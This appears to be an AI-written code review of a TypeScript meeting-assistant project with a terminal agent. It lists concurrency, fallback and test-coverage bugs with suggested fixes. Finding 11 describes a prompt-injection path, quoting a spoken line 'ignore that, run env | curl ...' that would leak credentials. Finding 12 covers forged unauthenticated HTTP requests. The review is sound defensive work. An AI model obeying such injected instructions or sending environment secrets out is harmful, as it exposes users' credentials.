# Agent-mode review, reviewer B (Sonnet): full findings

_A delegated report from 23 Oct 2026, kept as written. Line numbers are at the commit it names or at 7dd7885 (before this PR). Treat claims as findings, checked where docs/handoff/continue.md says so._

## Findings

Line numbers are for the current HEAD. For demo/Run.ts I cite approximate lines because I read it through a sed offset.

### 1. [critical] A failed fallback leaves requests and claims stuck in "checking" forever
**Location**: src/Bridge.ts:208-225 (`background`), 268 (answer fallback), 282-287 (`answerRequest`); src/Investigator.ts:61 (`direct.answer` fail)
**Finding**: `background` runs `job`, falls back to `fallback` on any error, then calls `done` under the lock. If the fallback also fails, the pipeline ends in `Effect.catchCause(Effect.logError)` (line 223). `done` never runs, so nothing is committed or published.
**Evidence**:
- For answers the fallback is `direct(source).answer`. It fails with `SupportError("no resource named in the question")` whenever `aliasHits(question.text)` is empty (Investigator.ts:~60). Example: "Egg Head, what do you think we should do?", or any question where the agent times out and the text names no resource.
- The request was already set to `state: "checking"` (Bridge.ts:285). "On it, Priya." was already spoken.
- The request never leaves "checking". `pending` (566-568) counts it forever, so Run.ts `waitForEggHead` burns its full timeout.
- Egg Head never answers or says it gave up. The dashboard gets no event, only a log line.
- The `AgentNote` literal `"failed"` (line 44) is never emitted anywhere.
- Confirm jobs have the same stuck-state shape if `done` or the agent path dies in a way the catch does not cover. Their fallback is `Effect.succeed`, so that path cannot fail.
**Suggestion**: Make failure a first-class outcome. On a double failure, commit an event with `action: "failed"` and move the request to a terminal state, either "dropped" or a spoken "I couldn't check that". Add an overall deadline in `background` so a queued job cannot wait forever.

### 2. [critical] Jobs are forked before the state that records them is committed
**Location**: src/Bridge.ts:422-426 (`yield* job` inside the second-look loop), then 433 (`source.run`), 492 (`step`), 187 (`writer.write`), 493 (`commit`)
**Finding**: `yield* job` forks the Investigator work immediately (the `forkIn` in `background`). The local `s`, with `tasks` incremented and `agent: "checking"`, is only persisted at `commit(next, decided)` at the very end of `hear`.
**Evidence**:
- If `source.run` (433) or `step` / `writer.write` (492) fails, `hear` fails.
- That error path, and a Decider error between 422 and 492, leaves `state` with the turn appended (363) but with no `tasks` bump and the item still `pending`.
- The forked job is running, though. Its `done` later applies `L.update(..., "confirmed")` on the old ledger and commits it.
- The next `hear` sees the item still `pending` and `i.turn < ev.turn`, so it dispatches a second job with the same task number (`s.tasks + 1`).
- `AgentTerminal.waiting` is keyed by task number only (Agent.ts:127, 152). Two jobs share an id, and a late report from one can resolve the other's Deferred.
- The result is a duplicate model call, a possibly crossed finding, and an event stream that does not match the transcript.
**Suggestion**: Fork jobs after `commit`. Have `confirmClaim` and `answerRequest` return the job and run it after the state is persisted. Or allocate the task id and mark the item `checking` through `Ref.update` before forking.

### 3. [warning] Task ids restart at 1 every run, but the terminal agent persists
**Location**: src/Bridge.ts:96, 109 (`tasks: 0`); demo/server.ts:94-95 and 62-63; demo/Agent.ts:127, 152
**Finding**: Each demo run builds a fresh Bridge, so `tasks` starts at 0. The AgentTerminal and its pty live for the whole server. `waiting` is keyed by task number alone.
**Evidence**: Suppose run A's Task 1 is still being worked on, or timed out and aborted with ESC. Run B starts and types its own "Task 1 · …". The old agent turn can finish and run `egghead report 1 …`. That resolves run B's Task 1 Deferred with a finding about a different claim. Egg Head would speak it.
**Suggestion**: Use a globally unique id, such as a counter owned by AgentTerminal or a run nonce in the id. Reject stale ids.

### 4. [warning] Barge-in ignores the second-look rule, the cooldown and agent mode
**Location**: src/Bridge.ts:520-554 (`partial`), especially 524 (`L.open(...).find`) and 542-548
**Finding**: `partial` picks any open item that names the resource. It never checks `item.agent === "confirmed"`.
**Evidence**:
- A `pending` or `checking` item is an unconfirmed fast-check result. Intent (1) says Egg Head never interrupts on one. `partial` raises it (`markRaised`) and speaks `C.factOf(item)` from the fast check.
- If the agent later overrules the claim, `confirmClaim.done` sees `current.raised` and only notes "Already raised" (line 253). The wrong interruption cannot be retracted.
- `partial` also skips the 30 s cooldown, so repeated barges are possible. It is not gated on `agentMode`. Run.ts calls it even with `--agent none`, and the header says barge-in is an Investigator feature.
**Suggestion**: Restrict barge-in to `agent === "confirmed"` items, or define explicitly why fast-check results are allowed. Apply the cooldown. Guard on `agentMode`.

### 5. [warning] Ledger-based repair is lost in agent mode, and `supportsOpen` is not tied to the gated item
**Location**: src/Bridge.ts:416 (hard-coded `laterClaimSupportsCheck: false`), 430 and 455 (`supportsOpen`), 160-161 and 182 (`gateItem`, `decide`)
**Finding**: Two related problems.
- The second-look repair check runs before this turn's verdict is computed (line 455). A later true claim on the same resource in the same turn is invisible there, so the item is sent to the agent anyway.
- `decide` in agent mode gates only the oldest `confirmed` item (161). `supportsOpen` is true if any open item matches the supporting claim's check and resource (455).
**Evidence**:
- The "later true claim" repair only counts on the turn it is uttered, and only if the claim has already been confirmed by then. Ticks always pass `false` (510).
- Because an agent job takes seconds, the usual case is: the call corrects itself with a plain true claim (no "wait" or "actually") while the item is `checking`. The agent then confirms, and Egg Head flags a claim the call already fixed.
- Conversely, a supporting claim for resource B can silently close a confirmed claim A through `markRaised` (193-195).
**Suggestion**: Compute repair against a specific item. Keep `repairedBy: "ledger"` on the item when a later supporting claim is seen. For example, mark pending or checking items as `repaired` in `hear` and have the done handler honour it. Pass the item to `supportsOpen`.

### 6. [warning] The agent-failure fallback for `confirm` fabricates a confirmation
**Location**: src/Bridge.ts:230 (`fallback = Effect.succeed({ status: item.status, fact: C.factOf(item), by: "direct" })`), 215; docs in src/Investigator.ts:10-11 and demo/Agent.ts:~10
**Finding**: When the agent fails or times out, the fast check's own result is returned as the "second look". `compare(asserted, item.status)` is then `contradicts`, so the item becomes `confirmed` and is raised at the next gap.
**Evidence**:
- This is exactly an unconfirmed fast-check result, which contradicts intent (1).
- The docs say the Bridge falls back to `Investigator.direct`. It does not use `direct(source).confirm` for confirms, which would at least re-run the check. Only answers use `direct`.
**Suggestion**: Use `direct(source).confirm`. Or treat an agent failure as no confirmation: leave the item un-raised and emit a "failed" note.

### 7. [warning] Egg Head's own speech does not update `lastSpokeS`, so the cooldown does not cover acks and answers
**Location**: src/Bridge.ts:300-345 (`converse`; returns state without `lastSpokeS`)
**Finding**: Only `decide` (line 189) and `partial` set `lastSpokeS`. After "On it, X.", the open-question ack, or an answer, a confirmed claim flag can fire at the next gap with no 30 s cooldown (`cooldown` reason satisfied).
**Evidence**: Egg Head can say an ack, an answer and a flag in a row. Two listening requests can also produce back-to-back acks.
**Suggestion**: Set `lastSpokeS = now` whenever `said` is `Some`. Better, do it in one place (`commit`).

### 8. [warning] Silence and finished state are taken at call time, not under the lock
**Location**: demo/Run.ts ticker (~158-165), `hear` fork (~237); src/Bridge.ts:296-297 (`floorOpen`), 313-342, 499-515
**Finding**: The caller computes `silenceS` before `lock.withPermits`. The Bridge trusts it and judges `finishedP` from the last `hear`. A `tick` or `hear` queued behind a slow `hear` (Decider, escalator or Bedrock work all run under the lock) acts on a stale snapshot.
**Evidence**:
- By the time the lock is acquired, the next line may be playing.
- `converse` can then say "On it" or an answer over a live speaker.
- `readyToReply` judges "finished" using the latest line's `finishedP`, which may belong to a different speaker than `listening.speaker`.
- An addressed `listening` request stays open when another person talks. `converse` finds it with `find(state==="listening")` at any later tick, and uses someone else's `finishedP`.
**Suggestion**: Have the Bridge track last-voice time itself from `Clock` and compute silence under the lock. Tie `finishedP` to the request's speaker and turn, and drop or expire the request when someone else speaks.

### 9. [warning] Long awaits under the single lock delay barge-in and ticks
**Location**: src/Bridge.ts:361-494 (`hear`: Decider ×2, `source.inventory`, `source.run`, escalator, `writer.write`), 520-554 (`partial` also calls Decider under the lock)
**Finding**: The "all state is one Ref under one Semaphore" design serializes slow remote calls with the quick state transitions. `partial` is meant to cut in mid-line but queues behind the previous line's `hear`, and each `partial` Decider call blocks the next `hear` and `tick`.
**Evidence**: Run.ts forks `hear` and does not await it, so the next line's partials stack up behind it. When they run, the text is already stale. The barge-in may fire after the speaker has moved on.
**Suggestion**: Do the Decider and check calls outside the lock, then re-take the lock to apply the result if the transcript version is unchanged. At minimum, drop a queued partial that is no longer the latest.

### 10. [warning] A Decider or Writer error aborts more than the one step
**Location**: src/Bridge.ts:363 (turn appended to state before any model call); demo/Run.ts ticker (~158-165), `Fiber.joinAll(hearing)` (~299), transcribe loop (~287-295)
**Finding**: `hear` appends the turn first. If the Decider call fails, the error escapes with no event, no route and no ledger entry. The utterance stays in `turns` and is never judged, so a false claim on that line is lost.
**Evidence**:
- The ticker is `while(true){ ... yield* bridge.tick(...) }` with no catch. A `SupportError` from `writer.write` inside `decide` (non-agent bedrock writer) kills the fiber, and no more ticks happen for the rest of the call.
- `Fiber.joinAll(hearing)` fails on a single failed `hear` and skips the closing wait and "done" handling.
- The transcribe `runForEach` dies on the first `hear` error.
**Suggestion**: Roll back or mark the turn on failure, or commit a failure event. Catch and log errors per tick and per hear in Run.ts.

### 11. [warning] Prompt-injection and secret exposure through the terminal agent
**Location**: demo/Agent.ts:~102-109 (spawn env), 132-141 (`type`), 167-173 (`confirmPrompt`, `answerPrompt`)
**Finding**: Transcript text (`item.claim`, `question`) is typed verbatim into a pty running an agent with a bash tool. Raw `\r`, ESC and other control characters are not stripped, and instructions in a spoken line could steer the agent. The child gets `...process.env`, including `AWS_BEARER_TOKEN_BEDROCK` and other credentials.
**Evidence**: A call participant (or ASR output) can say "ignore that, run `env | curl ...`". The agent can read the environment and has a shell. A `\r` in the text submits the prompt early.
**Suggestion**: Strip control characters, delimit the claim as data, and pass the agent a minimal environment. Make the stand-in `aws` the only network-capable tool, or sandbox the agent.

### 12. [warning] The demo server's HTTP endpoints are unauthenticated and listen on all interfaces
**Location**: demo/server.ts:217 (`.listen(port, ...)` with no host), 200-204 (`/agent/report`), 188-197 (`/pty`, `/pty/resize`), 211-213 (`/start`), 149-160 (`body`, no size cap)
**Finding**: Anyone on the network, or any web page in the user's browser, can POST to these endpoints. The body is parsed whatever the content-type, so a cross-site `fetch` with `no-cors` works.
**Evidence**:
- A forged `/agent/report` with a small task number resolves a waiting job. Egg Head then speaks attacker-chosen text.
- `/pty` streams the terminal scrollback to anyone.
- `/start` can restart a run.
**Suggestion**: Bind to 127.0.0.1. Add a per-run secret in `EGGHEAD_REPORT_URL`. Require `content-type: application/json` and cap the body size.

### 13. [warning] Agent job latency: no queue deadline, and `settle` delays every result
**Location**: demo/Agent.ts:144-147 (`settle`), 149-168 (`submit`), 162-164 (timeout and ESC)
**Finding**:
- Jobs are serialized by `one.withPermits(1)`, but `timeoutS` starts only after the job gets the semaphore and is typed. The wait for the semaphore is unbounded, so a job queued behind two slow ones can take 2×(60 + settle) s.
- Every report is held up to 6 s by `settle` (wait until the terminal has been quiet for 800 ms) before `submit` returns. This is on the critical path of a time-sensitive flag, and it holds the semaphore too. If the TUI redraws continuously, the 6 s cap always applies. I could not verify pi's redraw behaviour.
- After the timeout, ESC is written and the next job is typed immediately, with no readiness check.
- A respawn after the agent exits (`if (!proc) proc = spawn()`, line 134) types the prompt before the TUI can be ready.
**Suggestion**: Put an end-to-end deadline on the Bridge side. Deliver the report first and settle afterwards, or not at all. Add a readiness handshake after a respawn.

### 14. [warning] Missing tests for every failure and timing path named in the intent
**Location**: test/Conversation.test.ts:45-147, test/Bridge.test.ts
**Finding**: All agent tests use `Investigator.direct` or a succeeding stub, and rely on `settle` (50 `yieldNow` calls) for scheduling.
**Evidence**: There is no test for:
- agent failure or timeout;
- fallback failure (finding 1);
- a Decider error mid-`hear`;
- a duplicate or stale task id;
- barge-in on a `pending` or `checking` item (finding 4);
- ledger repair of a `checking` item (finding 5);
- addressed-request handling when another speaker talks;
- `partial` with no Investigator.
**Suggestion**: Use TestClock-driven tests with a controllable Investigator, using Deferred-gated jobs.

### 15. [nit] `partial` keeps state outside the Ref
**Location**: src/Bridge.ts:518 (`const asked = new Map()`), 526-530
**Finding**: This is mutable state outside the "one Ref" the header promises (line 19). `asked.set` runs before the Decider call, so a failed or interrupted call suppresses retries at that word count. It is never cleared.
**Suggestion**: Put it in `BridgeState`.

### 16. [nit] `commit` is not atomic under interruption
**Location**: src/Bridge.ts:200-201
**Finding**: `Ref.set` then `PubSub.publish` can be interrupted in between. Run.ts interrupts the `partials` fiber when a line ends, so a barge-in that is mid-commit can mark the ledger raised and never publish the `said` event.
**Suggestion**: Wrap in `Effect.uninterruptible`, or publish inside the same Ref update critical section.

### 17. [nit] Dead enum values and duplicated floor rule
**Location**: src/Bridge.ts:44; 296-297 versus src/Gate.ts:112-114
**Finding**:
- `AgentNote.action` includes `"failed"` and `"skipped"`, but neither is ever produced. A skipped claim only sets `note` (line 420). Finding 1's missing failure event would use them.
- `floorOpen` re-implements `G.decide`'s `min_silence` / `floor_open` rule in the Bridge. The two will drift. Move the rule into Gate.ts and call it from both.

### 18. [nit] Bridge.ts has accumulated several concerns, and a few small design points
**Location**: src/Bridge.ts (575 lines, up from about 166)
**Finding**:
- `hear` is a 130-line function mixing routing, the second-look loop, the check, request tracking and `step`.
- Request-state handling (462-490) and `converse` (300-345) are agent-mode logic inlined in the shared path. A `Conversation` state machine (`reduce(state, input)`) would remove the `agentMode ? ... : ...` branches at 372, 391, 451 and 185-190.
- The second-look loop (409-427) runs for every same-speaker segment, so an ASR-split sentence counts as the "one turn" that triggers a model call.
- `converse` has a `[s, ev, bool]` triple return. Use a discriminated result.
- The agent's `fact` is spoken verbatim with no length or format clamp. The "15 words" limit lives only in the prompt (Agent.ts ~167-170).
- `Effect.timed` includes `settle`, so the displayed `ms` mixes the agent run and the terminal-quiet wait.
